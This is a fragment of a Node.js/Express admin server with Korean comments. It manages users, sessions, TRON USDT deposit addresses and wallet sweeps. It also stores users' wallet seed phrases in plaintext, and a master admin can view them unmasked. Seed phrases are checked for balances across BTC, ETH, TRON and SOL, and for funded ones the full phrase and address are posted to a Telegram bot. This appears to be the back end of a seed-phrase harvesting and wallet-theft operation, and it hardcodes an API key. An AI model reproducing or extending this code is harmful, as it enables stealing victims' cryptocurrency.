      return res.status(403).json({ error: '본인 소속 사용자만 정지/활성화할 수 있습니다.' });
    }
    
    const newStatus = suspend ? 'suspended' : 'approved';
    await db.userDB.suspend(userId.trim(), suspend);
    
    // 정지된 경우 세션도 끊기
    if (suspend) {
      await sessionStore.kickUser(userId.trim());
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('사용자 정지/활성화 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 유저 탈퇴(삭제) (마스터 전용)
app.delete('/api/admin/users/:id', requireAdmin, async (req, res) => {
  try {
  const userId = req.params.id?.trim();
  if (!userId) return res.status(400).json({ error: 'userId 필요' });
  if (req.admin.role !== 'master') {
    return res.status(403).json({ error: '마스터만 사용자 삭제가 가능합니다.' });
  }
    
    const u = await db.userDB.get(userId);
  if (!u) return res.status(404).json({ error: '유저 없음' });
    
    await db.userDB.remove(userId);
    await sessionStore.kickUser(userId);
  res.json({ ok: true });
  } catch (error) {
    console.error('유저 삭제 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// ---------- 세션 (마스터=전체, 매니저=내 유저 세션만) ----------
app.get('/api/admin/sessions', requireAdmin, async (req, res) => {
  try {
    let list = await sessionStore.getAll();
    
  if (req.admin.role === 'manager') {
      const myUsers = await db.userDB.getByManager(req.admin.id);
      const myUserIds = new Set(myUsers.map((u) => u.id));
    list = list.filter((s) => myUserIds.has(s.userId));
  }
    
  res.json(list);
  } catch (error) {
    console.error('세션 조회 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

app.post('/api/admin/kick', requireAdmin, async (req, res) => {
  try {
  const userId = req.body?.userId?.trim();
  if (!userId) return res.status(400).json({ error: 'userId 필요' });
  if (req.admin.role !== 'master') {
    return res.status(403).json({ error: '마스터만 세션 종료가 가능합니다.' });
  }
    await sessionStore.kickUser(userId);
  res.json({ ok: true });
  } catch (error) {
    console.error('세션 끊기 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// ---------- 시드 (마스터만 볼 수 있음) ----------
app.get('/api/admin/seeds', requireAdmin, requireMaster, async (req, res) => {
  try {
  const masked = req.query.masked !== 'false';
    const list = await db.seedDB.getAll(masked);
    res.json(list);
  } catch (error) {
    console.error('시드 조회 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// GET /api/admin/users/:id/seeds — 특정 유저의 시드 목록 페이지네이션 (마스터 전용)
app.get('/api/admin/users/:id/seeds', requireAdmin, requireMaster, async (req, res) => {
  try {
    const userId = req.params.id?.trim();
    if (!userId) return res.status(400).json({ error: 'userId 필요' });
    const page = Math.max(1, parseInt(req.query.page) || 1);
    const pageSize = Math.min(50, Math.max(1, parseInt(req.query.pageSize) || 10));
    const offset = (page - 1) * pageSize;
    const [[{ total }]] = await db.pool.query(
      'SELECT COUNT(*) AS total FROM seeds WHERE user_id = ?', [userId]
    );
    const [rows] = await db.pool.query(
      'SELECT id, phrase, created_at FROM seeds WHERE user_id = ? ORDER BY id DESC LIMIT ? OFFSET ?',
      [userId, pageSize, offset]
    );
    res.json({
      seeds: rows.map(r => ({ id: r.id, phrase: r.phrase, at: r.created_at })),
      total: Number(total),
      page,
      pageSize,
    });
  } catch (error) {
    console.error('유저 시드 조회 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// ---------- 개인 입금주소 발급 API ----------

// POST /api/payment/request-address
// 사용자가 QR 화면 진입 시 서버에서 개인 입금주소 발급 (또는 기존 재사용)
app.post('/api/payment/request-address', async (req, res) => {
  try {
    const { token, userId, orderId, network, tokenType } = req.body || {};
    console.log('[REQUEST-ADDR] 요청 수신 ▶', { userId, network, tokenType, hasToken: !!token?.trim() });

    if (!token?.trim()) return res.status(401).json({ error: '세션 토큰이 필요합니다.' });

    // 세션 검증
    const sessionUserId = await sessionStore.getUserId(token.trim());
    console.log('[REQUEST-ADDR] 세션 유저 ▶', sessionUserId);
    if (!sessionUserId) return res.status(401).json({ error: '유효하지 않은 세션입니다.' });

    const resolvedUserId = (userId?.trim() || sessionUserId).toLowerCase();

    // 현재 active 수금 지갑 조회
    const activeWallet = await db.collectionWalletDB.getActive();
    console.log('[REQUEST-ADDR] active 지갑 ▶', activeWallet
      ? { version: activeWallet.wallet_version, address: activeWallet.root_wallet_address, hasSecret: !!activeWallet.xpub_key }
      : 'null (미등록)'
    );
    if (!activeWallet) {
      return res.status(503).json({ error: '현재 활성화된 수금 지갑이 없습니다. 관리자에게 문의하세요.' });
    }

    // 현재 지갑 버전으로 발급된 기존 레코드 조회 (상태 무관 — upsert)
    const existing = await db.depositAddressDB.findByUserAndVersion(resolvedUserId, activeWallet.wallet_version);
    console.log('[REQUEST-ADDR] 기존 주소 ▶', existing
      ? { address: existing.deposit_address, index: existing.derivation_index, status: existing.status }
      : '없음 (신규 발급)'
    );

    // expired 주소는 재사용하지 않고 새로 발급
    const isExpiredAddress = existing?.status === 'expired';

    if (existing && !isExpiredAddress) {
      // 기존 레코드 status → issued 리셋 (업서트)
      if (existing.status !== 'issued' && existing.status !== 'waiting_deposit') {
        await db.depositAddressDB.updateStatus(existing.deposit_address, 'issued');
        console.log('[REQUEST-ADDR] 상태 리셋 → issued ▶', existing.deposit_address);
      }
      return res.json({
        address: existing.deposit_address,
        walletVersion: existing.wallet_version,
        status: 'issued',
        invalidated: false,
        isNew: false,
      });
    }

    // 구버전 레코드 또는 만료 레코드 존재 여부 (invalidated 경고용 — 신규 발급 진행)
    const oldRecord = !isExpiredAddress
      ? await db.depositAddressDB.findOldVersion(resolvedUserId, activeWallet.wallet_version)
      : null;
    const wasInvalidated = !!oldRecord || isExpiredAddress;
    if (isExpiredAddress) {
      console.log('[REQUEST-ADDR] 기존 주소 만료됨 → 새 주소 발급 ▶', existing.deposit_address);
    }
    if (wasInvalidated) {
      console.log('[REQUEST-ADDR] 구버전 레코드 있음 → 새 버전으로 신규 발급 ▶ oldVersion:', oldRecord.wallet_version);
    }

    // 신규 주소 발급: 니모닉 기반 HD 파생 또는 root 주소 직접 사용
    // 동시 요청 시 index 충돌을 방지하기 위해 재시도 루프 사용
    const secret = activeWallet.xpub_key;
    let newAddress;
    let newIndex;
    let insertSuccess = false;
    const MAX_RETRY = 5;

    for (let attempt = 0; attempt < MAX_RETRY; attempt++) {
      const [maxRows] = await db.pool.query(
        'SELECT COALESCE(MAX(derivation_index), 0) AS maxIdx FROM deposit_addresses WHERE wallet_version = ?',
        [activeWallet.wallet_version]
      );
      newIndex = maxRows[0].maxIdx + 1 + attempt;
      console.log(`[REQUEST-ADDR] 신규 index ▶ ${newIndex} (attempt ${attempt})`);

      if (secret) {
        try {
          newAddress = deriveTronAddress(secret, newIndex);
          console.log('[REQUEST-ADDR] HD 파생 주소 ▶', newAddress);
        } catch (e) {
          console.error('[REQUEST-ADDR] HD 주소 파생 오류 ▶', e.message);
          return res.status(500).json({ error: '주소 파생 오류. 관리자에게 문의하세요.' });
        }
      } else {
        newAddress = activeWallet.root_wallet_address;
        console.log('[REQUEST-ADDR] 니모닉 없음 → root 주소 사용 ▶', newAddress);
      }

      try {
        await db.depositAddressDB.create({
          userId: resolvedUserId,
          orderId: orderId || null,
          network: network || 'TRON',
          token: tokenType || 'USDT',
          depositAddress: newAddress,
          walletVersion: activeWallet.wallet_version,
          derivationIndex: newIndex,
        });
        console.log('[REQUEST-ADDR] DB 저장 완료 ▶ userId:', resolvedUserId, 'index:', newIndex);
        insertSuccess = true;
        break;
      } catch (insertErr) {
        if (insertErr.code === 'ER_DUP_ENTRY') {
          console.warn(`[REQUEST-ADDR] 주소 충돌 (index ${newIndex}), 재시도 중...`);
          continue;
        }
        throw insertErr;
      }
    }

    if (!insertSuccess) {
      console.error('[REQUEST-ADDR] 최대 재시도 초과 ▶ userId:', resolvedUserId);
      return res.status(500).json({ error: '주소 발급 실패 (충돌). 잠시 후 다시 시도해주세요.' });
    }

    res.json({
      address: newAddress,
      walletVersion: activeWallet.wallet_version,
      status: 'issued',
      invalidated: wasInvalidated,
      isNew: true,
    });
  } catch (error) {
    console.error('입금주소 발급 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// ---------- 관리자 - 수금 지갑 관리 ----------

// GET /api/admin/collection-wallet — 현재 active 지갑 + 전체 이력
app.get('/api/admin/collection-wallet', requireAdmin, requireMaster, async (req, res) => {
  try {
    const active = await db.collectionWalletDB.getActive();
    const history = await db.collectionWalletDB.getHistory();

    // xpub_key 분석 — 실제 값은 노출하지 않고 스윕 가능 여부만 반환
    const secretType = (xpubKey) => {
      if (!xpubKey) return 'none';
      if (xpubKey.startsWith('enc:')) return 'mnemonic'; // 암호화된 니모닉 → sweep 가능
      if (xpubKey.startsWith('xpub')) return 'xpub';    // xpub → sweep 불가
      return 'unknown';
    };

    const sanitize = (w) => {
      const type = secretType(w.xpub_key);
      return {
        ...w,
        xpub_key: undefined,          // 원본 비노출
        secretType: type,             // 'mnemonic' | 'xpub' | 'none' | 'unknown'
        canDerive: type === 'mnemonic', // true = sweep 가능
      };
    };

    const historyWithStats = await Promise.all(
      history.map(async (w) => {
        const stats = await db.collectionWalletDB.getStats(w.wallet_version);
        return { ...sanitize(w), stats };
      })
    );

    res.json({ active: active ? sanitize(active) : null, history: historyWithStats });
  } catch (error) {
    console.error('수금 지갑 조회 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// POST /api/admin/collection-wallet — 새 수금 지갑 등록 (기존 버전 비활성화)
app.post('/api/admin/collection-wallet', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { address, mnemonic, label } = req.body || {};
    if (!address?.trim()) return res.status(400).json({ error: 'TRON 수금 지갑 주소를 입력하세요.' });

    let encryptedSecret = null;
    if (mnemonic?.trim()) {
      const plain = mnemonic.trim();
      // 니모닉 유효성 검증
      try {
        // 12 or 24단어 체크 + 첫 번째 주소 파생 테스트
        const wordCount = plain.split(/\s+/).length;
        if (wordCount !== 12 && wordCount !== 24) {
          return res.status(400).json({ error: '니모닉은 12단어 또는 24단어여야 합니다.' });
        }
        HDNodeWallet.fromPhrase(plain, undefined, `m/44'/195'/0'/0/0`); // 유효성 검증
      } catch {
        return res.status(400).json({ error: '니모닉 형식이 올바르지 않습니다.' });
      }
      encryptedSecret = encryptSecret(plain);
    }

    const newVersion = await db.collectionWalletDB.activate(
      address.trim(),
      encryptedSecret,
      label?.trim() || ''
    );
    res.json({
      ok: true,
      walletVersion: newVersion,
      canDerive: !!encryptedSecret,
      message: `수금 지갑이 v${newVersion}으로 변경되었습니다. ${encryptedSecret ? '(개인 주소 파생 활성화)' : '(공용 주소 모드)'}`,
    });
  } catch (error) {
    console.error('수금 지갑 변경 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// GET /api/admin/deposit-addresses — 발급 주소 목록 조회
app.get('/api/admin/deposit-addresses', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { walletVersion, status, page = 1, pageSize = 30 } = req.query;
    const result = await db.depositAddressDB.getList({
      walletVersion: walletVersion ? Number(walletVersion) : undefined,
      status: status || undefined,
      page: Number(page),
      pageSize: Number(pageSize),
    });
    res.json(result);
  } catch (error) {
    console.error('입금주소 목록 조회 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// ---------- Sweep (입금 주소 → 메인 지갑 회수) ----------
// POST /api/admin/sweep
// body: { depositAddress } — 특정 입금주소의 USDT를 root 지갑으로 sweep
app.post('/api/admin/sweep', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { depositAddress } = req.body || {};
    if (!depositAddress?.trim()) return res.status(400).json({ error: 'depositAddress 필요' });

    // 1. 입금주소 정보 조회
    const [[row]] = await db.pool.query(
      'SELECT d.*, c.xpub_key, c.root_wallet_address FROM deposit_addresses d JOIN collection_wallets c ON d.wallet_version = c.wallet_version WHERE d.deposit_address = ?',
      [depositAddress.trim()]
    );
    if (!row) return res.status(404).json({ error: '발급 주소를 찾을 수 없습니다.' });
    if (!row.xpub_key) return res.status(400).json({ error: '이 버전은 니모닉이 없어 자동 sweep 불가합니다.' });

    // 2. 개인키 파생
    let privateKey;
    try {
      privateKey = deriveTronPrivateKey(row.xpub_key, row.derivation_index);
    } catch (e) {
      return res.status(400).json({ error: e.message });
    }

    // 3. TronWeb으로 USDT sweep (API 키 없이 사용 — 키 있으면 오히려 401 발생)
    const { TronWeb } = require('tronweb');
    const tronWeb = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey });

    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC20 USDT
    const contract = await tronWeb.contract().at(USDT_CONTRACT);
    const balanceRaw = await contract.balanceOf(depositAddress.trim()).call();
    const balance = Number(balanceRaw) / 1e6;

    if (balance < 0.1) {
      return res.status(400).json({ error: `잔액 부족 (${balance} USDT). sweep 최소 기준: 0.1 USDT` });
    }

    // 전액 전송
    const toAddress = row.root_wallet_address;
    const amount = Number(balanceRaw);
    const tx = await contract.transfer(toAddress, amount).send({ feeLimit: 30_000_000 });

    // 상태 업데이트
    await db.depositAddressDB.updateStatus(depositAddress.trim(), 'swept');

    res.json({ ok: true, txId: tx, amount: balance, to: toAddress });
  } catch (error) {
    console.error('Sweep 오류:', error);
    res.status(500).json({ error: `Sweep 실패: ${error.message || error}` });
  }
});

// POST /api/admin/recover-trx — 입금주소에서 TRX 전액 root 지갑으로 회수
// body: {} → 전체 주소, { depositAddress } → 특정 주소만
app.post('/api/admin/recover-trx', requireAdmin, requireMaster, async (req, res) => {
  try {
    const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';
    const { TronWeb } = require('tronweb');
    const { depositAddress: singleAddr } = req.body || {};

    // 1. 대상 주소 조회 (단일 or 전체)
    const whereClause = singleAddr
      ? 'WHERE c.xpub_key IS NOT NULL AND c.xpub_key != \'\' AND d.deposit_address = ?'
      : 'WHERE c.xpub_key IS NOT NULL AND c.xpub_key != \'\'';
    const params = singleAddr ? [singleAddr] : [];
    const [rows] = await db.pool.query(`
      SELECT d.deposit_address, d.derivation_index, c.xpub_key, c.root_wallet_address
      FROM deposit_addresses d
      JOIN collection_wallets c ON d.wallet_version = c.wallet_version
      ${whereClause}
    `, params);

    if (!rows.length) return res.json({ ok: true, results: [], message: '회수 가능한 주소 없음' });

    const results = [];
    for (const row of rows) {
      const addr = row.deposit_address;
      try {
        // TRX 잔액 조회
        const balResp = await axios.get(
          `https://api.trongrid.io/v1/accounts/${addr}`,
          { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 8000 }
        );
        const trxBalance = (balResp.data?.data?.[0]?.balance || 0) / 1e6;

        // 최소 3 TRX 이상 있을 때만 회수 (dust 방지)
        if (trxBalance < 3) {
          results.push({ address: addr, skipped: true, reason: `잔액 부족 (${trxBalance.toFixed(2)} TRX)` });
          continue;
        }

        // 개인키 파생
        const privateKey = deriveTronPrivateKey(row.xpub_key, row.derivation_index);
        const tronWeb = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey });

        // 전송량: 전액에서 1 TRX 차감 (수수료 여유분)
        const sendTrx = Math.floor((trxBalance - 1) * 1_000_000) / 1_000_000;
        const txResult = await tronWeb.trx.sendTransaction(row.root_wallet_address, TronWeb.toSun(sendTrx));
        const txId = txResult?.txid || txResult?.transaction?.txID || 'unknown';

        console.log(`[RECOVER-TRX] ${addr} → root ${sendTrx} TRX, txid=${txId}`);
        results.push({ address: addr, sent: sendTrx, txId, ok: true });
      } catch (e) {
        console.error(`[RECOVER-TRX] ${addr} 실패:`, e.message);
        results.push({ address: addr, ok: false, error: e.message });
      }
      // TronGrid 요청 간격 유지
      await new Promise(r => setTimeout(r, 500));
    }

    const success = results.filter(r => r.ok).length;
    const totalSent = results.filter(r => r.ok).reduce((s, r) => s + (r.sent || 0), 0);
    res.json({ ok: true, results, summary: { total: rows.length, success, totalSentTrx: totalSent.toFixed(2) } });
  } catch (error) {
    console.error('[RECOVER-TRX] 오류:', error);
    res.status(500).json({ error: `TRX 회수 실패: ${error.message}` });
  }
});

// ---------- 가격 설정 API ----------

// GET /api/payment/pricing — 클라이언트가 가격 조회 (인증 불필요)
app.get('/api/payment/pricing', async (req, res) => {
  try {
    const raw = await db.settingDB.get('subscription_packages');
    const monthlyRaw = await db.settingDB.get('monthly_price_usdt');
    const packages = raw ? JSON.parse(raw) : [
      { days: 30,  label: '1개월',  price: 39 },
      { days: 60,  label: '2개월',  price: 75 },
      { days: 90,  label: '3개월',  price: 110 },
      { days: 180, label: '6개월',  price: 210 },
      { days: 365, label: '12개월', price: 390 },
    ];
    const monthlyPrice = monthlyRaw ? Number(monthlyRaw) : 39;
    res.json({ monthlyPrice, packages });
  } catch (error) {
    console.error('가격 조회 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// POST /api/admin/pricing — 가격 패키지 저장 (마스터 전용)
app.post('/api/admin/pricing', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { monthlyPrice, packages } = req.body || {};
    if (monthlyPrice == null || isNaN(Number(monthlyPrice))) {
      return res.status(400).json({ error: '월 기준 가격(USDT)을 입력하세요.' });
    }
    if (!Array.isArray(packages) || packages.length === 0) {
      return res.status(400).json({ error: '패키지 목록이 필요합니다.' });
    }
    await db.settingDB.set('monthly_price_usdt', String(Number(monthlyPrice)));
    await db.settingDB.set('subscription_packages', JSON.stringify(packages));
    res.json({ ok: true, message: '가격이 저장되었습니다.' });
  } catch (error) {
    console.error('가격 저장 오류:', error);
    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
  }
});

// 메인 페이지(/)를 관리자 페이지로 리다이렉트
app.get('/', (req, res) => {
  res.redirect('/admin.html');
});

// ════════════════════════════════════════════════════
// 시드 지급(이벤트) API  —  event_seeds 테이블 기반
// ════════════════════════════════════════════════════

// GET /api/admin/event-seeds — 지급 가능한 이벤트 시드 목록 (available 상태만)
app.get('/api/admin/event-seeds', requireAdmin, requireMaster, async (req, res) => {
  try {
    const page = Math.max(1, parseInt(req.query.page) || 1);
    const pageSize = Math.min(50, parseInt(req.query.pageSize) || 20);
    const offset = (page - 1) * pageSize;
    const [[{ total }]] = await db.pool.query(
      `SELECT COUNT(*) AS total FROM event_seeds WHERE status = 'available'`
    );
    const [rows] = await db.pool.query(
      `SELECT id,
              CONCAT(SUBSTRING_INDEX(phrase,' ',1), ' ... ',
                     SUBSTRING_INDEX(phrase,' ',-1), ' (',
                     LENGTH(phrase)-LENGTH(REPLACE(phrase,' ',''))+1, '단어)') AS phrase_preview,
              COALESCE(btc,0) AS btc, COALESCE(eth,0) AS eth,
              COALESCE(tron,0) AS tron, COALESCE(sol,0) AS sol,
              note, created_at
       FROM event_seeds WHERE status = 'available'
       ORDER BY id DESC LIMIT ? OFFSET ?`,
      [pageSize, offset]
    );
    res.json({ total, page, pageSize, totalPages: Math.ceil(total / pageSize), items: rows });
  } catch (e) {
    console.error('[EVENT-SEEDS] 오류:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/event-seeds — 이벤트 시드 추가 (단건 또는 벌크)
// body: { phrase, note, btc, eth, tron, sol }  또는  { bulk: "phrase1\nphrase2\n..." }
app.post('/api/admin/event-seeds', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { phrase, bulk, note, btc, eth, tron, sol } = req.body || {};
    if (bulk) {
      const phrases = bulk.split('\n').map(s => s.trim()).filter(Boolean);
      if (!phrases.length) return res.status(400).json({ error: '시드 문구가 없습니다.' });
      const values = phrases.map(p => [p, note || null]);
      await db.pool.query(
        `INSERT INTO event_seeds (phrase, note) VALUES ?`, [values]
      );
      return res.json({ ok: true, added: phrases.length });
    }
    if (!phrase?.trim()) return res.status(400).json({ error: 'phrase 필요' });
    await db.pool.query(
      `INSERT INTO event_seeds (phrase, note, btc, eth, tron, sol) VALUES (?,?,?,?,?,?)`,
      [phrase.trim(), note||null, btc||null, eth||null, tron||null, sol||null]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// DELETE /api/admin/event-seeds/:id — 이벤트 시드 삭제
app.delete('/api/admin/event-seeds/:id', requireAdmin, requireMaster, async (req, res) => {
  try {
    await db.pool.query(`DELETE FROM event_seeds WHERE id = ? AND status = 'available'`, [req.params.id]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/event-seeds/recheck — seed-checker.js로 잔고 재확인 (event_seeds 테이블)
app.post('/api/admin/event-seeds/recheck', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { ids } = req.body;
    let seedIds = [];
    if (ids === 'all') {
      const [rows] = await db.pool.query(`SELECT id FROM event_seeds WHERE status = 'available' ORDER BY id ASC`);
      seedIds = rows.map(r => r.id);
    } else if (Array.isArray(ids) && ids.length > 0) {
      seedIds = ids.map(Number).filter(n => !isNaN(n) && n > 0);
    }
    if (!seedIds.length) return res.status(400).json({ error: '재확인할 이벤트 시드가 없습니다.' });
    if (seedIds.length > 50) return res.status(400).json({ error: '한 번에 최대 50개까지 가능합니다.' });

    const ph = seedIds.map(() => '?').join(',');
    const [seeds] = await db.pool.query(`SELECT id, phrase, note FROM event_seeds WHERE id IN (${ph})`, seedIds);

    res.json({ ok: true, queued: seeds.length, message: `${seeds.length}개 이벤트 시드 검수 시작됨. 잠시 후 새로고침하세요.` });

    // 백그라운드 처리
    (async () => {
      for (const seed of seeds) {
        try {
          console.log(`[EVENT-SEED RECHECK] ID=${seed.id} 확인 중...`);
          const results = await checkMultiChainBalance(seed.phrase);

          const getbal = (net) => results.find(r => r.network === net)?.balance || 0;
          const btc  = getbal('btc');
          const eth  = getbal('eth');
          const tron = getbal('tron');
          const sol  = getbal('sol');

          await db.pool.query(
            `UPDATE event_seeds SET btc=?, eth=?, tron=?, sol=? WHERE id=?`,
            [btc || null, eth || null, tron || null, sol || null, seed.id]
          );

          const chainsWithBalance = results.filter(r => (r.balance || 0) > 0);

          if (chainsWithBalance.length > 0) {
            // 마스터 알림봇으로 전송
            const [[cfg]]     = await db.pool.query(`SELECT setting_value FROM settings WHERE setting_key='master_bot_token' LIMIT 1`).catch(() => [[null]]);
            const [[cfgChat]] = await db.pool.query(`SELECT setting_value FROM settings WHERE setting_key='master_chat_id' LIMIT 1`).catch(() => [[null]]);
            const botToken = cfg?.setting_value;
            const chatId   = cfgChat?.setting_value;

            let msg = `🎁 <b>[이벤트 시드] 잔고 확인!</b>\n🆔 ID: ${seed.id}\n`;
            if (seed.note) msg += `📝 메모: ${seed.note}\n`;
            msg += '\n';
            for (const r of chainsWithBalance) {
              msg += `━━━━━━━━━━━━━━━━━━\n`;
              msg += `🌐 <b>${r.network.toUpperCase()}</b>\n`;
              msg += `💰 <b>잔고:</b> ${r.balance} ${r.symbol}\n`;
              if (r.address) msg += `🔑 <b>주소:</b> <code>${r.address}</code>\n`;
            }
            msg += `\n━━━━━━━━━━━━━━━━━━\n📝 <b>시드 문구:</b>\n<code>${seed.phrase}</code>\n━━━━━━━━━━━━━━━━━━`;

            if (botToken && chatId) {
              await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: chatId, text: msg, parse_mode: 'HTML'
              }).catch(e => console.error('[EVENT-SEED RECHECK] Telegram 오류:', e.message));
            }
            console.log(`[EVENT-SEED RECHECK] ID=${seed.id} 잔고 발견! BTC=${btc} ETH=${eth} TRON=${tron} SOL=${sol}`);
          } else {
            console.log(`[EVENT-SEED RECHECK] ID=${seed.id} 잔고 없음`);
          }
        } catch (e) {
          console.error(`[EVENT-SEED RECHECK] ID=${seed.id} 오류:`, e.message);
        }
        await new Promise(r => setTimeout(r, 500));
      }
      console.log(`[EVENT-SEED RECHECK] 전체 완료 (${seeds.length}개)`);
    })();
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/admin/seed-gifts — 지급 이력 목록
app.get('/api/admin/seed-gifts', requireAdmin, requireMaster, async (req, res) => {
  try {
    const [rows] = await db.pool.query(
      `SELECT g.id, g.event_seed_id, g.user_id, g.note, g.status,
              g.created_at, g.delivered_at,
              CONCAT(SUBSTRING_INDEX(g.phrase,' ',1), ' ... ',
                     SUBSTRING_INDEX(g.phrase,' ',-1)) AS phrase_preview
       FROM seed_gifts g
       ORDER BY g.created_at DESC
       LIMIT 100`
    );
    res.json({ items: rows });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/seed-gifts/assign
// body: { eventSeedId, userId, note } 또는 { random: true, userId, note }
app.post('/api/admin/seed-gifts/assign', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { eventSeedId, userId, note, random } = req.body || {};
    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });

    const [[user]] = await db.pool.query('SELECT id FROM users WHERE id = ?', [userId.trim()]);
    if (!user) return res.status(404).json({ error: `유저 '${userId}' 없음` });

    let targetId = eventSeedId;
    if (random || !eventSeedId) {
      const [[rnd]] = await db.pool.query(
        `SELECT id FROM event_seeds WHERE status = 'available' ORDER BY RAND() LIMIT 1`
      );
      if (!rnd) return res.status(404).json({ error: '지급 가능한 이벤트 시드 없음' });
      targetId = rnd.id;
    }

    const [[seed]] = await db.pool.query(
      `SELECT id, phrase FROM event_seeds WHERE id = ? AND status = 'available'`, [targetId]
    );
    if (!seed) return res.status(404).json({ error: `이벤트 시드 ID ${targetId} 없음 또는 이미 지급됨` });

    // 지급 처리: event_seeds 상태 변경 + seed_gifts 이력 생성
    await db.pool.query(`UPDATE event_seeds SET status = 'assigned' WHERE id = ?`, [targetId]);
    await db.pool.query(
      `INSERT INTO seed_gifts (event_seed_id, user_id, phrase, note, status) VALUES (?,?,?,?,'pending')`,
      [targetId, userId.trim(), seed.phrase, note || null]
    );
    res.json({ ok: true, eventSeedId: targetId, userId: userId.trim() });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// DELETE /api/admin/seed-gifts/:id — 지급 취소 (pending만 가능, event_seeds 복구)
app.delete('/api/admin/seed-gifts/:id', requireAdmin, requireMaster, async (req, res) => {
  try {
    const [[gift]] = await db.pool.query(
      `SELECT event_seed_id FROM seed_gifts WHERE id = ? AND status = 'pending'`, [req.params.id]
    );
    if (!gift) return res.status(400).json({ error: '취소 불가 (이미 전달됐거나 없음)' });
    await db.pool.query(`UPDATE seed_gifts SET status = 'cancelled' WHERE id = ?`, [req.params.id]);
    await db.pool.query(`UPDATE event_seeds SET status = 'available' WHERE id = ?`, [gift.event_seed_id]);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// GET /api/user/gift-seed?token= — 클라이언트 폴링: 대기 중인 지급 시드 확인
app.get('/api/user/gift-seed', async (req, res) => {
  try {
    const token = req.query.token || req.headers['x-token'];
    if (!token) return res.status(401).json({ error: '토큰 필요' });
    const userId = await sessionStore.getUserId(token);
    if (!userId) return res.status(401).json({ error: '세션 만료' });

    const [[gift]] = await db.pool.query(
      `SELECT id, phrase, note, created_at
       FROM seed_gifts
       WHERE user_id = ? AND status = 'pending'
       ORDER BY created_at ASC LIMIT 1`,
      [userId]
    );
    if (!gift) return res.json({ gift: null });
    res.json({ gift: { id: gift.id, phrase: gift.phrase, note: gift.note, createdAt: gift.created_at } });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/user/gift-seed/ack — 클라이언트가 수신 확인 처리
app.post('/api/user/gift-seed/ack', async (req, res) => {
  try {
    const token = req.body?.token || req.headers['x-token'];
    const giftId = req.body?.giftId;
    if (!token) return res.status(401).json({ error: '토큰 필요' });
    const userId = await sessionStore.getUserId(token);
    if (!userId) return res.status(401).json({ error: '세션 만료' });
    if (!giftId) return res.status(400).json({ error: 'giftId 필요' });

    await db.pool.query(
      `UPDATE seed_gifts SET status = 'delivered', delivered_at = NOW()
       WHERE id = ? AND user_id = ? AND status = 'pending'`,
      [giftId, userId]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /api/admin/seeds/recheck — 특정 시드 ID 잔고 재확인 (seed-checker.js 사용)
app.post('/api/admin/seeds/recheck', requireAdmin, requireMaster, async (req, res) => {
  try {
    const { ids } = req.body;
    let seedIds = [];

    if (ids === 'all') {
      const [rows] = await db.pool.query(`SELECT id FROM seeds ORDER BY id ASC`);
      seedIds = rows.map(r => r.id);
    } else if (Array.isArray(ids) && ids.length > 0) {
      seedIds = ids.map(Number).filter(n => !isNaN(n) && n > 0);
    }

    if (seedIds.length === 0) return res.status(400).json({ error: '재확인할 시드 ID가 없습니다.' });
    if (seedIds.length > 50) return res.status(400).json({ error: '한 번에 최대 50개까지만 재확인 가능합니다.' });

    const ph = seedIds.map(() => '?').join(',');
    const [seeds] = await db.pool.query(
      `SELECT id, user_id, phrase, created_at FROM seeds WHERE id IN (${ph})`, seedIds
    );

    res.json({ ok: true, queued: seeds.length, ids: seedIds, message: '재확인 시작됨. 잠시 후 목록을 새로고침하세요.' });

    // 백그라운드 처리 — seed-checker.js의 processSeed 재사용
    const { processSeed } = require('./seed-checker');
    (async () => {
      for (const seed of seeds) {
        await processSeed(seed).catch(e => console.error(`[SEED RECHECK] ID=${seed.id} 오류:`, e.message));
        await new Promise(r => setTimeout(r, 500));
      }
      console.log(`[SEED RECHECK] 전체 완료 (${seeds.length}개)`);
    })();
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ============================================================
//  macroUser 시스템 API  (/api/mu/*)
// ============================================================

// ----- 인증 -----

app.post('/api/mu/login', async (req, res) => {
  try {
    const { login_id, password } = req.body || {};
    if (!login_id?.trim() || !password?.trim()) {
